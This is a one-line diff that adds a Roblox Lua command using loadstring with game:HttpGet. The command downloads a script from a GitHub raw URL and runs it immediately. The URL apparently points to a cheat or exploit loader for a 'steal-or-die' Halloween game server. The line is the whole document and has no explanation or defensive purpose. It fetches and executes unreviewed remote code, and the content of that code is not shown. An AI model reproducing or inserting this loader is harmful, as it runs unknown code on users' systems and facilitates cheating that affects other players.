@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/steal-or-die-vc-servers-halloween-spam7-y7qwcyaqmbrj4p.lua"))()
